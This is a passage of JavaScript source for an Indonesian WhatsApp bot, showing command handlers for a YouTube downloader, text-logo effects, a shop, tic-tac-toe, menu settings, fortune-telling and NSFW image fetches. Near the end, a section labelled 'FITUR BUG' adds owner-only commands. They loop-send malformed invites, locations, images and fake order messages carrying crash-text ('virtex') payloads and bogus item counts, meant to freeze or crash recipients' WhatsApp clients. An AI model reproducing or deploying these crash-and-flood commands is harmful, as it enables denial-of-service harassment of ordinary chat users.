return setReply("Link salah")
}

 let link =`https://youtube.com/watch?v=${videoId}`
let anu = await yts(link)
let info = await ytdl.getInfo(link);
let format = ytdl.chooseFormat(info.formats, { quality: '18' });
if(Number(format.contentLength) > 40000000 ) return setReply(`Bjir sizenya ${FileSize(format.contentLength)}\nAu ah ga mao download 😤`)

teks =`*YOUTUBE VIDEO DOWNLOADER*

📂 Title : ${anu.all[0].title}
💾 Ext : 360p
📄 Size : ${FileSize(format.contentLength)}
🆔 ID : ${videoId}
⏲️ Duration : ${anu.all[0].timestamp}
📊 Viewers : ${h2k(anu.all[0].views)}
🌐 Upload At : ${anu.all[0].ago}
🔖 Author : ${anu.all[0].author.name}
📹 Channel : ${anu.all[0].author.url}
🔗 Url : ${anu.all[0].url}
📝 Description : ${anu.all[0].description}`

sendFileFromUrl(anu.all[0].image, image, {quoted: dev, caption: teks})
downloadMp4(q) 
//sendMediaURL (from, format.url, "Nih")
limitAdd(senderNumber, user)
  } catch(err){
setReply(`${err}`)
}
break
	
	
	case 'joker':
	if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
	setReply(mess.wait)
	textpro("https://textpro.me/create-logo-joker-online-934.html", [
    `${q}`,])
  .then((data) => sendFileFromUrl(data, image, {quoted: dev, caption: "Nih"}))
  .catch((err) => console.log(err));
   break
	
	
	
	
	
	case 'dropwater':
	if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
	setReply(mess.wait)
	textpro("https://textpro.me/dropwater-text-effect-872.html", [
    `${q}`,])
  .then((data) => sendFileFromUrl(data, image, {quoted: dev, caption: "Nih"}))
  .catch((err) => console.log(err));
   break
	
	
	
	case 'neonlight':
	if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
	setReply(mess.wait)
	textpro("https://textpro.me/neon-light-text-effect-with-galaxy-style-981.html", [
    `${q}`,])
  .then((data) => sendFileFromUrl(data, image, {quoted: dev, caption: "Nih"}))
  .catch((err) => console.log(err));
   break
	
	
	case 'thewall':
	if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
	setReply(mess.wait)
	textpro("https://textpro.me/break-wall-text-effect-871.html", [
    `${q}`,])
  .then((data) => sendFileFromUrl(data, image, {quoted: dev, caption: "Nih"}))
  .catch((err) => console.log(err));
   break
	
	
	
	
	
	case 'natural':
	if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
	setReply(mess.wait)
	textpro("https://textpro.me/natural-leaves-text-effect-931.html", [
    `${q}`,])
  .then((data) => sendFileFromUrl(data, image, {quoted: dev, caption: "Nih"}))
  .catch((err) => console.log(err));
   break
	
	
	
	
	case 'carbon':
	if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
	setReply(mess.wait)
	textpro("https://textpro.me/carbon-text-effect-833.html", [
    `${q}`,])
  .then((data) => sendFileFromUrl(data, image, {quoted: dev, caption: "Nih"}))
  .catch((err) => console.log(err));
   break
	
	
	
	
	case 'pencil':
	if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
	setReply(mess.wait)
	textpro("https://textpro.me/create-a-sketch-text-effect-online-1044.html", [
    `${q}`,])
  .then((data) => sendFileFromUrl(data, image, {quoted: dev, caption: "Nih"}))
  .catch((err) => console.log(err));
   break
	
	
case 'shop':
teks = `
*]────「 SHOP」────[*

Halo ${pushname} 
Saldo : Rp ${getBalance(senderNumber, user).toLocaleString()}

• List Harga
1 Limit : Rp 1000
1 Limit Game : Rp 750
1 Jam Premium : Rp 50,000

NOTE :
Untuk membeli Limit ketik ${prefix}buylimit jumlah limit
Contoh : ${prefix}buylimit 10

Untuk membeli Limit Game ketik ${prefix}buyglimit jumlah limit
Contoh : ${prefix}buyglimit 10`
setReply(teks)
break

	
	         case 'tictactoe': case 'ttt': case 'ttc':
            if(!isGroup) return setsetReply("Hanya bisa di group")
		
                if (isTicTacToe(from, tictactoe)) return setReply(`Masih ada game yg blum selesai`)
            //    if (args.length < 2) return setReply(`Kirim perintah *${prefix}tictactoe* @tag`)
                if (mentionByTag.length == 1) {
				if (mentionByTag[0] === botNumber) return setReply(`Tidak bisa bermain dengan bot!`)
                if (mentionByTag[0] === sender) return setReply(`Sad amat main ama diri sendiri`)
                     var hadiah = randomNomor(2500)
				     mentions(`@${sender.split('@')[0]} menantang @${mentionByTag[0].split('@')[0]}\nuntuk bermain TicTacToe\n\nKetik Y untuk bermain 👊\nKetik N untuk menolak 👎\nKetik ${prefix}delttt untuk membatalkan permainan 🚫\n\nHadiah : Rp ${hadiah.toLocaleString()}`, [sender, mentionByTag[0]], false)
                     tictactoe.push({
                        id: from,
                        status: null,
						hadiah: hadiah,
                        penantang: sender,
                        ditantang: mentionByTag[0],
                        TicTacToe: ['1️⃣','2️⃣','3️⃣','4️⃣','5️⃣','6️⃣','7️⃣','8️⃣','9️⃣']
                     })
					 gameAdd(senderNumber, user)
                } else {
                    setReply(`Kirim perintah *${prefix}tictactoe* @tag`)
                }
                break
			case 'delttt':
            case 'delttc':
 if(!isGroup) return setsetReply("Hanya bisa di group")
				if (isGame(senderNumber, isOwner, gcount, user)) return setReply(`Limit game kamu sudah habis`)
                if (!isTicTacToe(from, tictactoe)) return setReply(`Tidak ada sesi game tictactoe di grup ini`)
                var posi = getPosTic(from, tictactoe)
                if (tictactoe[posi].penantang.includes(sender)) {
                    tictactoe.splice(posi, 1)
                    setReply(`Berhasil menghapus sesi tictactoe di grup ini`)
                 } else if (tictactoe[posi].ditantang.includes(sender)) {
                     tictactoe.splice(posi, 1)
                     setReply(`Berhasil menghapus sesi tictactoe di grup ini`)
                 } else if (isGroupAdmins) {
                     tictactoe.splice(posi, 1)
                     setReply(`Berhasil menghapus sesi tictactoe di grup ini`)
                 } else if (isOwner) {
                     tictactoe.splice(posi, 1)
                     setReply(`Berhasil menghapus sesi tictactoe di grup ini`)
                 } else {
                   setReply(`Anda tidak bisa menghapus sesi tictactoe, karena bukan pemain!`)
                }
                break
                
                

	

          
        
        
case 'nsfwmenu':   
menunya = hentong.ahah(prefix, pushname)
let woker = [{"buttonId": `INFO BOTZ`,"buttonText": {"displayText": `ɪɴғᴏ ʙᴏᴛᴢ`},"type": "RESPONSE"},
                       {"buttonId": `${prefix}sewabot`,"buttonText": {"displayText": `sᴇᴡᴀ ʙᴏᴛᴢ`},"type": "RESPONSE"}]
if(setmenu === "katalog") {
costum(`*Loading...*`)
sendKatalog(hentong.ahah(prefix, pushname))
} else if(setmenu === "troli") {
sendTroli(hentong.ahah(prefix, pushname))
} else if(setmenu === "lokasi") {
costum(`*Loading...*`)
sendButLocation(from, menunya, `© ${fake1}`, fs.readFileSync('./stik/allmenu.jpg'), woker, {contextInfo: forward})
} else if(setmenu === "gif") {
costum(`*Loading...*`)
sendGif(fs.readFileSync('./stik/video.mp4'), menunya + `\n\nBaterai : ${baterai.battery}\n© ${fake1}`)
} else if(setmenu === "dokumen") {
costum(`*Loading...*`)
Sendbutdocument(from, menunya,`Baterai : ${baterai.battery}\n© ${fake1}`, fs.readFileSync('./stik/thumbnaildokumen.jpg'), woker, options)
} else if(setmenu === "image") {
costum(`*Loading...*`)
sendButImage(from, menunya, `Baterai : ${baterai.battery}\n© ${fake1}`, fs.readFileSync('./stik/allmenu.jpg'), woker, {thumbnail: thumb, fileLength: 999999999999 })
}
break

	
	
case 'menu':
case 'help':   
case 'allmenu':   
try{
stod = `${sender}`
menunya = help.menu(dateIslamic, thisHit ,listcmdblock, explain, kyun, process, timeWit, timeWita, timeWib, thePrefix, fs, isPremium, getLimit, limitCount, getBalance, senderNumber, blocked, ban, listerror, user, autosticker, forwarding, fake,autoread, autovn, typing,antibugtroli,Toxic, isAntihidetag, isKickarea, isAntiLink, AntiVirtex, isAntiviewonce, hitnya, pushname, ucapanWaktu, prefix, publik, week, weton, calender)
let mok = [{"buttonId": `INFO BOTZ`,"buttonText": {"displayText": `ɪɴғᴏ ʙᴏᴛᴢ`},"type": "RESPONSE"},
                    {"buttonId": `SEWA BOTZ`,"buttonText": {"displayText": `sᴇᴡᴀ ʙᴏᴛᴢ`},"type": "RESPONSE"}]
  options = {contextInfo: { forward, externalAdReply:{title: `${ucapanWaktu} kak`,previewType:"PHOTO",thumbnail: thumb, sourceUrl:"https://youtu.be/_IlvsY7S7j8"}}}  
options1 = {quoted: setQuoted, contextInfo: { forward, externalAdReply:{title:`${ucapanWaktu} ${pushname}`,body:`*click here to play music`,mediaType:"2",thumbnail: thumb,mediaUrl:`https://www.instagram.com/reel/CZCA-viBoxa/?utm_medium=copy_link`}}}
if(setmenu === "katalog") {
costum(`*Loading...*`)
sendKatalog(menunya)
}  else if(setmenu === "troli") {
sendTroli(menunya)
}else  if(setmenu === "document") {
costum(`*Loading...*`)
Sendbutdocument(from, menunya,`Baterai : ${baterai.battery}\n© ${fake1}`,fs.readFileSync('./stik/thumbnaildokumen.jpg'), mok, options1)
} else  if(setmenu === "lokasi") {
costum(`*Loading...*`)
sendButLocation(from, menunya, `Baterai : ${baterai.battery}\n© ${fake1}`, fs.readFileSync('./stik/thumb.jpeg'), mok, {contextInfo: forward})
} else  if(setmenu === "gif") {
costum(`*Loading...*`)
sendGif(fs.readFileSync('./stik/video.mp4'), menunya + `\n\nBaterai : ${baterai.battery}\n© ${fake1}`)
} else if(setmenu === "image") {
costum(`*Loading...*`)
sendButImage(from, menunya, `Baterai : ${baterai.battery}\n© ${fake1}`, fs.readFileSync('./stik/thumb.jpeg'), mok, options)
}
} catch(err) {
sendMess(err)
sendTroli(menunya)
}
break
	
	
	
	
        case 'setmenu':
	if(!isOwner) return
	if ((args[0]) === 'katalog'|| (args[0]) === 'product' ){
		setmenu = "katalog"
		await sendButMessage(from, `Berhasil mengubah tampilan menu ke ${q}`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}profile`, buttonText: {displayText: `ᴘʀᴏғɪʟᴇ`,},type: 1},
                      {buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}]);
		} else if ((args[0]) === 'image'|| (args[0]) === 'foto' ){
		setmenu = "image"
		await sendButMessage(from, `Berhasil mengubah tampilan menu ke ${q}`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}profile`, buttonText: {displayText: `ᴘʀᴏғɪʟᴇ`,},type: 1},
                      {buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}]);
		} else if ((args[0]) === 'lokasi' ){
		setmenu = "lokasi"
		await sendButMessage(from, `Berhasil mengubah tampilan menu ke ${q}`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}profile`, buttonText: {displayText: `ᴘʀᴏғɪʟᴇ`,},type: 1},
                      {buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}]);
		} else if ((args[0]) === 'troli' ){
		setmenu = "troli"
		await sendButMessage(from, `Berhasil mengubah tampilan menu ke ${q}`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}profile`, buttonText: {displayText: `ᴘʀᴏғɪʟᴇ`,},type: 1},
                      {buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}]);
		}else if ((args[0]) === 'pptx'){
		docType = "pptx"
		setmenu = "document"
		await sendButMessage(from, `Berhasil mengubah tampilan menu ke ${q}`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}profile`, buttonText: {displayText: `ᴘʀᴏғɪʟᴇ`,},type: 1},
                      {buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}]);
		} else if ((args[0]) === 'xlsx'){
		docType = "xlsx"
		setmenu = "document"
		await sendButMessage(from, `Berhasil mengubah tampilan menu ke ${q}`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}profile`, buttonText: {displayText: `ᴘʀᴏғɪʟᴇ`,},type: 1},
                      {buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}]);
	} else if ((args[0]) === 'zip'){
		docType = "zip"
		setmenu = "document"
		await sendButMessage(from, `Berhasil mengubah tampilan menu ke ${q}`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}profile`, buttonText: {displayText: `ᴘʀᴏғɪʟᴇ`,},type: 1},
                      {buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}]);
		} else if ((args[0]) === 'pdf'){
		docType = "pdf"
		setmenu = "document"
		await sendButMessage(from, `Berhasil mengubah tampilan menu ke ${q}`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}profile`, buttonText: {displayText: `ᴘʀᴏғɪʟᴇ`,},type: 1},
                      {buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}]);
	} else if ((args[0]) === 'docx'){
		docType = "docx"
		setmenu = "document"
		await sendButMessage(from, `Berhasil mengubah tampilan menu ke ${q}`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}profile`, buttonText: {displayText: `ᴘʀᴏғɪʟᴇ`,},type: 1},
                      {buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}]);
	} else if ((args[0]) === 'gif'){
		setmenu = "gif"
		await sendButMessage(from, `Berhasil mengubah tampilan menu ke ${q}`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}profile`, buttonText: {displayText: `ᴘʀᴏғɪʟᴇ`,},type: 1},
                      {buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}]);
	}  else if (!q) {
                      sendButMessage(from, `SETTING MENU\n1.Katalog\n2.Troli\n3.Lokasi\n4.Pptx\n5.Xlsx\n6.Zip\n7.Pdf\n8.Docx\n9.gif`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}setmenu katalog`, buttonText: {displayText: `ᴋᴀᴛᴀʟᴏɢ`},type: 1},
                      {buttonId: `${prefix}setmenu troli`, buttonText: {displayText: `ᴛʀᴏʟɪ`},type: 1},
                      {buttonId: `${prefix}setmenu lokasi`, buttonText: { displayText: `ʟᴏᴋᴀsɪ`},type: 1}]);
                    } else {
                    setReply("Menu tidak di temukan om")
                    }
	break
        



        





case 'setquoted':
	if(!isOwner) return onlyOwner()
	if ((args[0]) === 'ftoko'|| (args[0]) === 'product' ){
		if(Qoted === "ftoko") return setReply("Udah aktif")
		Qoted = "ftoko"
		await xdev.sendMessage(from,`Berhasil mengubah quoted ke ${q}`, text, {quoted: ftoko})
		} else if ((args[0]) === 'fkontak' ){
		if(Qoted === "fkontak") return setReply("Udah aktif")
		Qoted = "fkontak"
		await xdev.sendMessage(from,`Berhasil mengubah quoted ke ${q}`, text, {quoted: fkontak})
		} else if ((args[0]) === 'ftext'){
		if(Qoted === "ftext") return setReply("Udah aktif")
		Qoted = "ftext"
		await xdev.sendMessage(from,`Berhasil mengubah quoted ke ${q}`, text, {quoted: ftext})
		} else if ((args[0]) === 'ftroli'){
		if(Qoted === "ftroli") return setReply("Udah aktif")
		Qoted = "ftroli"
		await xdev.sendMessage(from,`Berhasil mengubah quoted ke ${q}`, text, {quoted: ftroli})
		}else if ((args[0]) === 'fsticker' ){
		if(Qoted === "fsticker") return setReply("Udah aktif")
		Qoted = "fsticker"
		await xdev.sendMessage(from,`Berhasil mengubah quoted ke ${q}`, text, {quoted: fsticker})
		} else if ((args[0]) === 'fvn'){
		if(Qoted === "fvn") return setReply("Udah aktif")
		Qoted = "fvn"
		await xdev.sendMessage(from,`Berhasil mengubah quoted ke ${q}`, text, {quoted: fvn})
		} else if ((args[0]) === 'floc'){
		if(Qoted === "floc") return setReply("Udah aktif")
		Qoted = "floc"
		await xdev.sendMessage(from,`Berhasil mengubah quoted ke ${q}`, text, {quoted: floc})
		} else if ((args[0]) === 'fvideo' ){
		if(Qoted === "fvideo") return setReply("Udah aktif")
		Qoted = "fvideo"
		await xdev.sendMessage(from,`Berhasil mengubah quoted ke ${q}`, text, {quoted: fvideo})
		} else if ((args[0]) === 'fgc'){
		if(Qoted === "fgc") return setReply("Udah aktif")
		Qoted = "fgc"
		await xdev.sendMessage(from,`Berhasil mengubah quoted ke ${q}`, text, {quoted: fgc})
		} else if ((args[0]) === 'fgif'){
		if(Qoted === "fgif") return setReply("Udah aktif")
		Qoted = "fgif"
		await xdev.sendMessage(from,`Berhasil mengubah quoted ke ${q}`, text, {quoted: fgif})
		}else if ((args[0]) === 'fimage'){
		if(Qoted === "fimage") return setReply("Udah aktif")
		Qoted = "fimage"
		await xdev.sendMessage(from,`Berhasil mengubah quoted ke ${q}`, text, {quoted: fimage})
		} else if ((args[0]) === 'dev'){
		if(Qoted === "dev") return setReply("Udah aktif")
		Qoted = "dev"
		await xdev.sendMessage(from,`Berhasil mengubah quoted ke ${q}`, text, {quoted: dev})
		} else if (!q) {
        sendButMessage(from, `SETTING QUOTED`, `Silahkan pilih salah satu`, [
        {buttonId: `${prefix}setquoted ftoko`, buttonText: {displayText: `ғᴛᴏᴋᴏ`},type: 1},
        {buttonId: `${prefix}setquoted fkontak`, buttonText: {displayText: `ғᴋᴏɴᴛᴀᴋ`},type: 1},
        {buttonId: `${prefix}setquoted ftext`, buttonText: { displayText: `ғᴛᴇxᴛ`},type: 1}]);
         } else {
 teks =`Quoted yang kamu masukan salah\nSilakan pilih salah satu quoted berikut:\n1.ftoko\n2.fkontak\n3.ftext\n4.ftroli\n5.fsticker\n6.fvn\n7.floc\n8.fvideo\n9.fgc\n10.fgif\n11.fimage\n12.dev`
 setReply(teks)
 }
	break



case 'setreply':
if(!isOwner) return onlyOwner()
if ((args[0]) === 'web'|| (args[0]) === 'situs' ){
if(replyType === "web") return setReply("Udah aktif")
replyType = "web"
setReply(`Berhasil mengubah set reply ke ${q}`)
} else if ((args[0]) === 'troli' ){
if(replyType === "troli") return setReply("Udah aktif")
replyType = "troli"
setReply(`Berhasil mengubah set reply ke ${q}`)
} else if ((args[0]) === 'mess'){
if(replyType === "mess") return setReply("Udah aktif")
replyType = "mess"
setReply(`Berhasil mengubah set reply ke ${q}`)
} else if ((args[0]) === 'vidio'|| (args[0]) === 'video' ){
if(replyType === 'vidio') return setReply("Udah aktif")
replyType = "video"
setReply(`Berhasil mengubah setReply ke ${q}`)
} else if ((args[0]) === 'quoted' ){
if(replyType === 'quoted') return setReply("Udah aktif")
replyType = "quoted"
setReply(`Berhasil mengubah set reply ke ${q}`)
} else if (!q) {
sendButMessage(from, `SETTING REPLY\n1. web\n2. troli\n3. mess\n4. vidio\n5. quoted\n`, `Silahkan pilih salah satu`, [
{buttonId: `${prefix}setreply web`, buttonText: {displayText: `ᴡᴇʙ`},type: 1},
{buttonId: `${prefix}setreply troli`, buttonText: {displayText: `ᴛʀᴏʟɪ`},type: 1},
{buttonId: `${prefix}setreply mess`, buttonText: { displayText: `ᴍᴇss`},type: 1}]);
 } else {
 setReply("Set Reply Tidak Di Temukan")
}
break






  
	case 'setbc':
	if(!isOwner) return onlyOwner()
	if ((args[0]) === 'troli'|| (args[0]) === 'product' ){
		if(setBc === "troli") return setReply("Udah aktif")
		setBc = "troli"
		await xdev.sendMessage(from,"Berhasil mengubah broadcast ke troli", text, {quoted: setQuoted})
		} else if ((args[0]) === 'lokasi' ){
		if(setBc === "lokasi") return setReply("Udah aktif")
		setBc = "lokasi"
		await xdev.sendMessage(from,"Berhasil mengubah broadcast ke lokasi", text, {quoted: setQuoted})
		} else if ((args[0]) === 'document' || (args[0]) === 'pdf' || (args[0]) === 'dokumen' || (args[0]) === 'ori'){
		if(setBc === "document") return setReply("Udah aktif")
		setBc = "document"
		await xdev.sendMessage(from,"Berhasil mengubah broadcast ke dokumen", text, {quoted: setQuoted})
		} else if (!q) {
                      sendButMessage(from, `SETTING BROADCAST`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}setbc pdf`, buttonText: {displayText: `ᴅᴏᴋᴜᴍᴇɴ`},type: 1},
                      {buttonId: `${prefix}setbc troli`, buttonText: {displayText: `ᴛʀᴏʟɪ`},type: 1},
                      {buttonId: `${prefix}setbc lokasi`, buttonText: { displayText: `ʟᴏᴋᴀsɪ`},type: 1}]);
                    }
	break
	
	
	
		
	
	
	
	 

	
	
	                case 'neko':
					case 'waifu':
					case 'trap':
					case 'blowjob':
					
					if (!checkDataId ("nsfw", from, DataId)  && isGroup) return setReply("Fitur nsfw blom aktif")
					if (isLimit(senderNumber, isPremium, isOwner, limitCount, user)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
					setReply(mess.wait)
					ana = await fetchJson(`https://api.waifu.pics/nsfw/${command}`)
                    sendMediaURL(from, ana.url, 'Done!')
                    limitAdd(senderNumber, user)
					break
					
					case 'yuri':
					case 'kiss':
					case 'cum':
					case 'futanari':
					case 'hentai':
					case 'eroyuri':
					case 'eron':
					case 'erok':
					case 'ero':
					case 'solo':
					case 'erokemo':
					case 'fox_girl':
					case 'feet':
					case 'les':
					case 'feed':
					case 'bj':
					if (!checkDataId ("nsfw", from, DataId)  && isGroup) return setReply("Fitur nsfw blom aktif")
					if (isLimit(senderNumber, isPremium, isOwner, limitCount, user)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
					setReply(mess.wait)
					ana = await fetchJson(`https://nekos.life/api/v2/img/${command}`)
					sendMediaURL(from, ana.url, 'Done!')
                    limitAdd(senderNumber, user)
					break
				
				     
                     case 'neko':
                     case 'shinobu':
                     case 'megumin':
				     case 'bully':
                     case 'cuddle':
                     case 'cry':
                     case 'hug':
				     case 'awoo':
                     case 'kiss':
                     case 'lick':
                     case 'pat':
				     case 'smug':
                     case 'bonk':
                     case 'yeet':
                     case 'blush':
				     case 'smile':
                     case 'wave':
                     case 'highfive':
                     case 'handhold':
				     case 'nom':
                     case 'bite':
                     case 'glomp':
                     case 'slap':
				     case 'kill':
                     case 'happy':
                     case 'wink':
					setReply(mess.wait)
					if (isLimit(senderNumber, isPremium, isOwner, limitCount, user)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
					ana = await fetchJson(`https://api.waifu.pics/sfw/${command}`)
					sendMediaURL(from, ana.url, 'Done!')
                    limitAdd(senderNumber, user)
					break
					
					case 'waifunime':
					setReply(mess.wait)
					if (isLimit(senderNumber, isPremium, isOwner, limitCount, user)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
					ana = await fetchJson(`https://api.waifu.pics/sfw/waifu`)
                    sendMediaURL(from, ana.url, 'Done!')
                    limitAdd(senderNumber, user)
					break
					
					
					
					
					case 'baka':
					case 'hug':
					case 'kemonomimi':
					case 'holo':
					setReply(mess.wait)
					if (isLimit(senderNumber, isPremium, isOwner, limitCount, user)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
					ana = await fetchJson(`https://nekos.life/api/v2/img/${command}`)
                    sendMediaURL(from, ana.url, 'Done!')
                    limitAdd(senderNumber, user)
					break
				
	
	
	//PRIMBON
	case 'artinama':
	try{
	if(!q) return setReply("Namanya apa kak ?")
	primbon.artiNama(q).then(res => {
    setReply(res)
})
} catch (err) {
console.log(err)
setReply("Bjeer error, coba lagi dong 😋")
}
break



case 'artimimpi':
try{
if(!q) return setReply("Mimpi apa semalem ?")
primbon.tafsirMimpi(q).then(res => {
    setReply(res)
})
} catch (err) {
console.log(err)
setReply("Bjeer error, coba lagi dong 😋")
}
break


case 'namapasangan':
try{
if(!q) return setReply("Namanya siapa kak ? Contoh jajas titin")
if(args.length < 2) return setReply("Masukan nama pasangan Contoh jajas titin")
if(args.length > 2) return setReply("Masukan nama pasangan Contoh jajas titin")
primbon.Jodoh(args[0],args[1]).then(res => {
    setReply(res)
})
} catch (err) {
console.log(err)
setReply("Bjeer error, coba lagi dong 😋")
}
break

case 'tanggaljadian':
try{
if(!q) return setReply("Tanggal berapa kak ? Contoh 01-07-2000")
primbon.tanggaljadi(q).then(res => {
    setReply(res)
})
} catch (err) {
console.log(err)
setReply("Bjeer error, coba lagi dong 😋")
}
break

case 'tipewatak':
try{
if(!q) return setReply("Teksnya ? Contoh nih Michelle Ziudith 20-1-1995")
if(args.length < 2) return setReply("Masukan Teksnya Contoh nih Michelle  20-1-1995")
if(args.length > 2) return setReply("Masukan Teksnya Contoh nih Michelle  20-1-1995")
primbon.watakartis(args[0], args[1]).then(res => {
    setReply(res)
})
} catch (err) {
console.log(err)
setReply("Bjeer error, coba lagi dong 😋")
}
break

case 'ramalanjodoh':
try{
if(!q) return setReply(" Teksnya ? Contoh nih joe 11-4-2003 putri 1-2-2005")
if(args.length < 4) return setReply("Masukan Teksnya Contoh nih joe 11-4-2003 putri 1-2-2005")
if(args.length > 4) return setReply("Masukan Teksnya Contoh nih joe 11-4-2003 putri 1-2-2005")
primbon.ramalanjodoh(args[0], args[1], args[2],args[3]).then(res => {
    setReply(res)
})
} catch (err) {
console.log(err)
setReply("Bjeer error, coba lagi dong 😋")
}
break

case 'ramalanrejeki':
try{
if(!q) return setReply("Tanggalnya mana kak Contoh 11-1-2000")
primbon.rejekiweton(q).then(res => {
    setReply(res)
})
} catch (err) {
console.log(err)
setReply("Bjeer error, coba lagi dong 😋")
}
break


case 'kecocokannama':
try{
if(!q) return setReply("Tanggalny mana kak Contoh angel 18-5-20005")
if(args.length < 2) return setReply("Masukan Tanggalny Contoh angel 18-5-20005")
if(args.length > 2) return setReply("Masukan Tanggalny Contoh angel 18-5-20005")
primbon.kecocokannama(args[0], args[1]).then(res => {
    setReply(res)
})
} catch (err) {
console.log(err)
setReply("Bjeer error, coba lagi dong 😋")
}
break

case 'haribaik':
try{
if(!q) return setReply("Tanggalnya mana kak Contoh 1-1-2000")
primbon.haribaik(q).then(res => {
    setReply(res)
})
} catch (err) {
console.log(err)
setReply("Bjeer error, coba lagi dong 😋")
}
break



case 'harilarangan':
try{
if(!q) return setReply("Tanggal nya mana kak Contoh 1-1-2000")
primbon.harilarangan(q).then(res => {
    setReply(res)
})
} catch (err) {
console.log(err)
setReply("Bjeer error, coba lagi dong 😋")
}
break








	
	
	
	
      
           
           
           
	
	
	
        
        
        
        
        
        
        
	
	
	
	
	
	
	
	
  
  
  
  
  
  

           
  
  
  
  
  
  
  
                    case 'readmore':
			    	case 'more':
			    	const more = String.fromCharCode(8206)
			    	const readmore = more.repeat(4001)
				    if (!q.includes('|')) return  setReply("Penggunaan teks| teks")
                    const text1 = q.substring(0, q.indexOf('|') - 0)
                    const text2 = q.substring(q.lastIndexOf('|') + 1)
                    setReply( text1 + readmore + text2)
                    break
  
  
  
  
  
 
  
  


  

	
	
	
	
//-------------------------------》FITUR BUG《-------------------------------\\
	
case 'kirin':
      if(isExtream) return
           if (!isOwner) return onlyOwner()
                        if (args.length < 1) return reply ('jumlahnya berapa kak')
				 for (let i = 0; i < args[0]; i++) {
           xdev.sendMessage(from, {
                        'groupName': fake,
                        'groupJid': '6285156137901-1627579259@g.us',
                        'inviteCode': 'JUJkLCf4mRF0oBuAlwEhO6',
                        'inviteExpiration': '0',
                        'caption': virtex7(prefix),
                        'jpegThumbnail': davizin,
                    }, MessageType.groupInviteMessage, { contextInfo: forward
                    })        
           }
           break
 
 
 
 case 'katsu':
      if(isExtream) return
           if (!isOwner) return onlyOwner()
                        if (args.length < 1) return reply ('jumlahnya berapa kak')
				 for (let i = 0; i < args[0]; i++) {
           xdev.sendMessage(from, {
                            degreesLatitude: 36.036105801662316,
                              degreesLongitude: 138.09072320256624,
                            name: virtex7(prefix),
                               address: virtex6(prefix),
                             jpegThumbnail: virgam,
                              }, location,
                              {contextInfo: forward})
                             
           }
           break
           
           
           case 'kamui':
                if(isExtream) return
           if (!isOwner) return onlyOwner()
                        if (args.length < 1) return reply ('jumlahnya berapa kak')
				 for (let i = 0; i < args[0]; i++) {
           var kirin = xdev.prepareMessageFromContent(from, {
        "imageMessage": {
                            "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
                            "mimetype": "image/jpeg",
                            "caption": fake,
                            "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
                            "fileLength": "28777",
                            "height": 1080,
                            "width": 1079,
                            "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
                            "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
                            "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
                            "mediaKeyTimestamp": "1610993486",
                            "jpegThumbnail": virgam,
                            "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
                            }
                      }, {
              contextInfo: forward
                });
                 xdev.relayWAMessage(kirin)
                             
           }
           break
 
 
 
 
	
	
	case 'amaterasu':
     if(isExtream) return
      if (!isOwner) return onlyOwner()
{
var kirim = xdev.prepareMessageFromContent(from, {
                    'orderMessage': {
                        'orderId': '0@s.whatsapp.net',
                        'thumbnail': virgam,
                        'itemCount': jumlahTroli,
                        'status': 1,
                        'surface': 1,
                        'message': philip(prefix),
                        'orderTitle': fake,
                        'sellerJid': `0@s.whatsapp.net`,
                      'token': 'ydkskyshj755hfuej',
                    }
                }, {
              contextInfo: {forwardingScore: 100000000, isForwarded: true, sendEphemeral: true}
                });
                 xdev.relayWAMessage(kirim)
                 
                 
                 
         xdev.sendMessage(from, virtex8(prefix), text,  {
                    'quoted': {
                        'key': {
                            'fromMe': false,
                            'participant': `0@s.whatsapp.net`,
                            'remoteJid': "0@s.whatsapp.net"
                        },
                        'message': {
                            'orderMessage': {
                                'itemCount': jumlahTroli,
